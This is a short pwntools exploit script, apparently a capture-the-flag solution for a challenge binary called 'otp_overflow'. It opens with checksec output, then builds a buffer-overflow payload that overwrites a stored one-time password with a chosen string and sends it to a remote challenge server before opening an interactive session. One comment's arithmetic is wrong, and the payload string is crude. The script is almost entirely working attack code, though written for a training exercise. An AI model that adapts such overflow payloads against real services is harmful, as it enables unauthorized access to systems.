'''CHECKSEC
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
'''

from pwn import *

namebin = "./otp_overflow"

context.binary = ELF(namebin)

datasize = 32
maxbofsize = 50
control_over_otp = maxbofsize-datasize    # 50 - 30 = 18
rest_size = datasize - control_over_otp

meme = b"SessoScimmiesco69"+b'\x00'     #should be equals to size(control_over_opt)
payload = meme + b'P'*rest_size +  meme

#p = process(namebin)
p = remote("cyberchallenge.diag.uniroma1.it", "5147")
p.send(payload)
p.interactive()

